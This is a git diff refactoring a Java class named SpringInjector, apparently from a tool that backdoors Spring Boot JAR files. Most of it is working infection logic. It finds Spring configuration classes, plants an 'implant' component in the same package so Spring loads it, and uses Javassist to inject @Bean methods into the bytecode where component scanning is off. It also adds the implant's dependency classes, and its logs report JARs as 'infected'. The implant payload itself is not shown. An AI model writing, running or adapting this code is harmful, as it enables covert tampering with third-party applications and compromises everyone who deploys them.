@@ -4,39 +4,51 @@ import javassist.bytecode.*;
 import javassist.bytecode.annotation.Annotation;
 import javassist.bytecode.annotation.MemberValue;
 
-import java.io.DataInputStream;
-import java.io.IOException;
-import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
 import java.util.logging.Logger;
-import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
-public class SpringInjector {
+public class SpringInjector implements Injector {
     private final static Logger log = Logger.getLogger("SpringInjector");
     private final ImplantHandler implantComponentHandler;
     private final ImplantHandler implantSpringConfigHandler;
 
-    public SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
+    SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
         this.implantComponentHandler = implantComponentHandler;
         this.implantSpringConfigHandler = implantSpringConfigHandler;
     }
 
-    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
+    public static SpringInjector createLoadedWith(ImplantHandler componentImplant, ImplantHandler springConfigImplant) throws ImplantException {
+        // Validate Spring component implant
+        ClassFile componentSpecimen = componentImplant.loadFreshRawSpecimen();
+        if (findAllSpringAnnotatedMethods(componentSpecimen).isEmpty()) {
+            throw new ImplantException("No Spring things in component implant.");
+        }
+
+        // Validate Spring config implant
+        ClassFile springConfigSpecimen = springConfigImplant.loadFreshRawSpecimen();
+        if (findAllSpringBeanMethods(springConfigSpecimen).isEmpty()) {
+            throw new ImplantException("No @Bean method(s) in Spring config implant.");
+        }
+
+        return new SpringInjector(componentImplant, springConfigImplant);
+    }
+
+    @Override
+    public boolean injectInto(JarFiddler jar) {
         boolean didInfect = false;
         boolean foundSignedClasses = false;
 
-        if (jarLooksSigned(targetJarFilePath)) {
+        if (jarLooksSigned(jar)) {
             log.warning("JAR looks signed. This is not yet implemented. Aborting.");
             return false;
         }
 
-        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
         int countConfigModifications = 0;
         int countComponentsCreated = 0;
-        for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
+        for (JarFiddler.Entry entry : jar) {
             if (!entry.getName().endsWith(".class")) {
                 continue;
             }
@@ -45,58 +57,52 @@ public class SpringInjector {
                 continue;
             }
 
-            ClassFile currentlyProcessing;
-            try (DataInputStream in = new DataInputStream(entry.getContentStream())) {
-                currentlyProcessing = new ClassFile(in);
-                if (!isSpringConfigurationClass(currentlyProcessing)) {
-                    continue;
-                }
-                log.fine("Found Spring configuration '" + entry.getName() + "'.");
-
-                /*
-                 * By adding our own Spring component (like a RestController) into the JAR under the same package
-                 * as the Spring config class, Spring will happily load it automatically. This is assuming that
-                 * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
-                 * component needs to be explicitly referenced as a @Bean in the config class.
-                 */
-                ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
-                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
-                String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
-                implantComponent.setName(targetPackageName + "." + implantComponentClassName);
-                JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
-                try {
-                    fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
-                    countComponentsCreated++;
-                } catch (ZipException e) {
-                    // QUICKFIX: The entry most likely already exist in the ZIP file
-                    log.warning("Class '" + newJarEntry + "' already exist in JAR '" + outputJar + "'. Skipping.");
-                    continue;
-                    // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
-                }
-                log.fine("Created implant class '" + newJarEntry.getName() + "'.");
-
-                if (!hasComponentScanEnabled(currentlyProcessing)) {
-                    /*
-                     * Component Scanning seems to not be enabled for this Spring configuration.
-                     * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
-                     */
-                    log.fine("Spring configuration '" + entry.getName() + "' is not set to automatically scan for components (@ComponentScan).");
-
-                    ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
-                    if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
-                        log.warning("Class '" + entry.getName() + "' already infected. Skipping.");
-                        continue;
-                    }
-
-                    entry.replaceContentWith(asByteArray(currentlyProcessing));
-                    countConfigModifications++;
-                    log.fine("Injected @Bean method into '" + entry.getName() + "'.");
-                }
-
-                didInfect = true;
-            } catch (ClassNotFoundException e) {
-                throw new RuntimeException(e);
+            ClassFile currentlyProcessing = readClassFile(entry.getContent());
+            ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
+            if (!isSpringConfigurationClass(currentlyProcessing)) {
+                continue;
             }
+            log.fine("Found Spring configuration '" + entry.getName() + "'.");
+
+            /*
+             * By adding our own Spring component (like a RestController) into the JAR under the same package
+             * as the Spring config class, Spring will happily load it automatically. This is assuming that
+             * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
+             * component needs to be explicitly referenced as a @Bean in the config class.
+             */
+            ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
+            ClassName renamedImplantComponentName = ClassName.of(implantComponent).renamePackage(currentlyProcessingName);
+            implantComponent.setName(renamedImplantComponentName.getFullClassName());
+            JarEntry newJarEntry = new JarEntry(renamedImplantComponentName.getSpringJarEntryPath());
+            try {
+                jar.addNewEntry(newJarEntry, asByteArray(implantComponent));
+                countComponentsCreated++;
+            } catch (DuplicateEntryException e) {
+                log.warning("Class '" + newJarEntry + "' already exist in JAR '" + jar + "'. Skipping.");
+                break;
+            }
+            log.fine("Created implant class '" + newJarEntry.getName() + "'.");
+
+            if (!hasComponentScanEnabled(currentlyProcessing)) {
+                /*
+                 * Component Scanning seems to not be enabled for this Spring configuration.
+                 * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
+                 */
+                log.fine("Spring configuration '" + entry.getName() + "' is not set to automatically scan for components (@ComponentScan).");
+
+                ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+                Optional<ClassFile> modifiedSpringConfig = addBeanToSpringConfig(currentlyProcessing, implantSpringConfig, implantComponent);
+                if (modifiedSpringConfig.isEmpty()) {
+                    log.warning("Class '" + entry.getName() + "' already infected. Skipping.");
+                    continue;
+                }
+
+                entry.replaceContentWith(asByteArray(modifiedSpringConfig.get()));
+                countConfigModifications++;
+                log.fine("Injected @Bean method into '" + entry.getName() + "'.");
+            }
+
+            didInfect = true;
         }
         log.info("Modified " + countConfigModifications + " Spring configuration classes.");
         log.info("Created " + countComponentsCreated + " Spring component classes.");
@@ -107,85 +113,85 @@ public class SpringInjector {
 
         // Add any dependency classes needed for the implant
         if (didInfect) {
-            Map<String, byte[]> allDependencies = new HashMap<>();
+            Map<ClassName, byte[]> allDependencies = new HashMap<>();
             allDependencies.putAll(implantSpringConfigHandler.getDependencies());
             allDependencies.putAll(implantComponentHandler.getDependencies());
             // Since this injector involves two different implant handlers, do a bit of manual exclusion of themselves
-            allDependencies.remove(convertToJarEntryPathName(implantSpringConfigHandler.getImplantClassName()));
-            allDependencies.remove(convertToJarEntryPathName(implantComponentHandler.getImplantClassName()));
+            allDependencies.remove(implantSpringConfigHandler.getImplantClassName());
+            allDependencies.remove(implantComponentHandler.getImplantClassName());
             // Also note that the dependencies are not renamed in any way
             // Any custom classes bundled with the implant will contain the whole package name etc
 
-            for (Map.Entry<String, byte[]> dependencyEntry : allDependencies.entrySet()) {
-                String fileName = dependencyEntry.getKey();
+            for (Map.Entry<ClassName, byte[]> dependencyEntry : allDependencies.entrySet()) {
+                ClassName className = dependencyEntry.getKey();
                 byte[] fileContent = dependencyEntry.getValue();
 
-                JarEntry newJarEntry = new JarEntry("BOOT-INF/classes/" + fileName);
+                JarEntry newJarEntry = new JarEntry(className.getClassFilePath());
                 try {
-                    fiddler.addNewEntry(newJarEntry, fileContent);
-                } catch (ZipException e) {
+                    jar.addNewEntry(newJarEntry, fileContent);
+                } catch (DuplicateEntryException e) {
                     // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
-                    log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
+                    log.severe("Dependency file '" + className.getClassFilePath() + "' already exist. Aborting.");
                     didInfect = false;
                     break;
                 }
             }
         }
 
-        if (didInfect) {
-            fiddler.write(outputJar);
-            log.info("Wrote output JAR to '" + outputJar + "'.");
-        } else {
-            log.warning("No output JAR was written.");
-        }
-
         return didInfect;
     }
 
-    static boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) throws ClassNotFoundException {
-        String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
-        String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
-        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
+    static Optional<ClassFile> addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) {
+        ClassFile clonedSpringConfig = cloneClassFile(existingSpringConfig);
+
+        ClassName implantSpringConfigClassName = ClassName.of(implantSpringConfig);
+        ClassName existingSpringConfigClassName = ClassName.of(existingSpringConfig);
+        ClassName implantComponentClassName = ClassName.of(implantComponent);
+
+        String implantPackageDesc = implantSpringConfigClassName.getPackageName().replace(".", "/");
+        String targetPackageDesc = existingSpringConfigClassName.getPackageName().replace(".", "/");
 
         // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
         for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
-            MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethod.getName());
+            MethodInfo existingImplantControllerBean = clonedSpringConfig.getMethod(implantBeanMethod.getName());
             if (existingImplantControllerBean != null) {
-                return false;
+                // The method that's about to be implanted already exists in the target class. Abort.
+                return Optional.empty();
             }
 
+            Map<String, String> translateTable = new HashMap<>();
+            translateTable.put(implantPackageDesc + "/" + implantComponentClassName.getClassName(), targetPackageDesc + "/" + implantComponentClassName.getClassName());
+            translateTable.put(implantSpringConfigClassName.getClassFormatInternalName(), existingSpringConfigClassName.getClassFormatInternalName());
+
+            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
+            MethodInfo targetBeanMethod = new MethodInfo(clonedSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
+
+            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(clonedSpringConfig.getConstPool(), translateTable);
+            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
+            targetBeanMethod.setCodeAttribute(codeAttr);
+
+            ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
+            if (exceptionsAttr != null) {
+                ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(clonedSpringConfig.getConstPool(), translateTable);
+                targetBeanMethod.setExceptionsAttribute(exceptions);
+            }
+
+            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
+
             try {
-                Map<String, String> translateTable = new HashMap<>();
-                translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
-                translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
-
-                String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
-                MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
-                targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
-
-                CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
-                codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
-                targetBeanMethod.setCodeAttribute(codeAttr);
-
-                ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
-                if (exceptionsAttr != null) {
-                    ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(existingSpringConfig.getConstPool(), translateTable);
-                    targetBeanMethod.setExceptionsAttribute(exceptions);
-                }
-
-                copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
-
-                existingSpringConfig.addMethod(targetBeanMethod);
+                clonedSpringConfig.addMethod(targetBeanMethod);
             } catch (DuplicateMemberException e) {
-                throw new RuntimeException(e);
+                // This should already have be checked for
+                throw new RuntimeException("Method '" + targetBeanMethod + "' already exist in '" + clonedSpringConfig.getName() + "' which is already checked for. This is unexpected.", e);
             }
         }
 
-        return true;
+        return Optional.of(clonedSpringConfig);
     }
 
     // Copy all annotations from implant method to target method. Notice the const pools!
-    static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
+    static void copyAllMethodAnnotations(MethodInfo target, MethodInfo source) {
         AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
         if (sourceAttr == null) {
             // The source method does not have any annotations. Is this fine?
@@ -221,6 +227,29 @@ public class SpringInjector {
         target.addAttribute(targetAnnotationsAttr);
     }
 
+    private static List<MethodInfo> findAllSpringAnnotatedMethods(ClassFile springComponent) {
+        List<MethodInfo> results = new ArrayList<>(1);
+
+        for (MethodInfo method : springComponent.getMethods()) {
+            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
+            if (attr == null) {
+                continue;
+            }
+            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
+                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
+            }
+
+            for (Annotation annotation : annotationAttr.getAnnotations()) {
+                String annotationType = annotation.getTypeName();
+                if (annotationType.startsWith("org.springframework.")) {
+                    results.add(method);
+                }
+            }
+        }
+
+        return results;
+    }
+
     private static List<MethodInfo> findAllSpringBeanMethods(ClassFile springController) {
         List<MethodInfo> results = new ArrayList<>(1);
 
@@ -244,7 +273,7 @@ public class SpringInjector {
         return results;
     }
 
-    private static boolean isSpringConfigurationClass(final ClassFile classFile) {
+    private static boolean isSpringConfigurationClass(ClassFile classFile) {
         List<Annotation> springAnnotations = classFile.getAttributes().stream()
                 .filter(attribute -> attribute instanceof AnnotationsAttribute)
                 .map(attribute -> (AnnotationsAttribute) attribute)
@@ -256,7 +285,7 @@ public class SpringInjector {
         return !springAnnotations.isEmpty();
     }
 
-    private static boolean isAnySpringContextAnnotation(final Annotation annotation) {
+    private static boolean isAnySpringContextAnnotation(Annotation annotation) {
         return switch (annotation.getTypeName()) {
             case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
             case "org.springframework.context.annotation.Configuration" -> true;
@@ -264,7 +293,7 @@ public class SpringInjector {
         };
     }
 
-    private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
+    private static boolean hasComponentScanEnabled(ClassFile springContextClassFile) {
         Set<String> annotationsThatActivatesComponentScanning = Set.of(
                 "org.springframework.context.annotation.ComponentScan",
                 "org.springframework.boot.autoconfigure.SpringBootApplication"
